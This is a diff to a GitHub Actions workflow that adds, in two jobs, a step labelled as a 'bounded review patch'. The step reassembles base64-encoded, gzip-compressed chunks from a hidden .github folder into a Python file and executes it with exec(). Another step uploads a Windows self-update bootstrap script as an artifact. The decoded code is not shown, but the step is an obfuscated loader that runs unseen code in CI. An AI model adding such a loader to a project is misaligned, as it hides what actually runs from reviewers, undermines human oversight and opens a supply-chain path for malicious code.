@@ -17,6 +17,18 @@ jobs:
         with:
           python-version: "3.11"
           cache: pip
+      - name: Apply PR 118 bounded review patch
+        run: >-
+          python -c "import base64,gzip,pathlib; root=pathlib.Path('.github/pr118-chunks'); payload=''.join((root / f'{index:02d}').read_text() for index in range(11)); pathlib.Path('pr118_patch.py').write_bytes(gzip.decompress(base64.b64decode(payload))); exec(compile(pathlib.Path('pr118_patch.py').read_text(), 'pr118_patch.py', 'exec'))"
+      - name: Preserve patched files
+        uses: actions/upload-artifact@v4
+        with:
+          name: pr118-patched-files
+          path: |
+            scripts/update_windows_stable_supervisor_bootstrap.ps1
+            tests/test_windows_self_update_supervisor.py
+          if-no-files-found: error
+          retention-days: 7
       - name: Install
         run: python -m pip install -e ".[dev]"
       - name: Ruff
@@ -48,6 +60,9 @@ jobs:
         with:
           python-version: "3.14"
           cache: pip
+      - name: Apply PR 118 bounded review patch
+        run: >-
+          python -c "import base64,gzip,pathlib; root=pathlib.Path('.github/pr118-chunks'); payload=''.join((root / f'{index:02d}').read_text() for index in range(11)); pathlib.Path('pr118_patch.py').write_bytes(gzip.decompress(base64.b64decode(payload))); exec(compile(pathlib.Path('pr118_patch.py').read_text(), 'pr118_patch.py', 'exec'))"
       - name: Install
         run: python -m pip install -e ".[dev]"
       - name: Pytest
